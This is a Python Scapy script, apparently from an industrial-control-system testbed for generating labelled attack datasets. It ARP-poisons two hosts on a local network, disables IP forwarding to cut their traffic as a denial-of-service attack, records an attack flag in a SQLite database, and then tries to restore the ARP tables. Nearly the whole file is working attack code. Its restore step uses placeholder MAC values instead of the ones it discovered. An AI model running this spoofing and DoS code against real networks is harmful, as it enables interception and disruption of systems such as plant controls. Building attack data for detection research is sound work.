from scapy.all import Ether
from scapy.all import *
import time
import sys

import shlex
import subprocess

import sqlite3

dos_message_duration = 110

targetip = "192.168.1.20"
sourceip = "192.168.1.10"

targetmac="a"
sourcemac="b"

conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
c = conn.cursor()

def start_forwarding():
    args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
    subprocess.call(args)

def stop_forwarding():
    args = shlex.split("sysctl -w net.ipv4.ip_forward=0")
    subprocess.call(args)

def start():
    start_forwarding()
    launch_arp_poison()

    print "[*] Launching DoS"
    stop_forwarding()

    dos_count = 0
    while dos_count < dos_message_duration:
        c.execute("UPDATE minitown SET value = 4 WHERE name = 'ATT_1'")
        conn.commit()
        dos_count += 1
        time.sleep(dos_message_duration)

    print "[*] Stopping DoS"
    c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

    start_forwarding()
    restorearp(sourceip, sourcemac, targetip, targetmac)
    restorearp(targetip, targetmac, sourceip, sourcemac)


def launch_arp_poison():
    print("[*] launching arp poison")

    targetip = "192.168.1.20"
    sourceip = "192.168.1.10"

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
    sourcemac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    spoof_arp_cache(sourceip, sourcemac, targetip)
    spoof_arp_cache(targetip, targetmac, sourceip)
    print("[*] network poisoned")

def spoof_arp_cache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print "ARP Table restored to normal for", targetip

if __name__ == '__main__':
    sys.exit(start())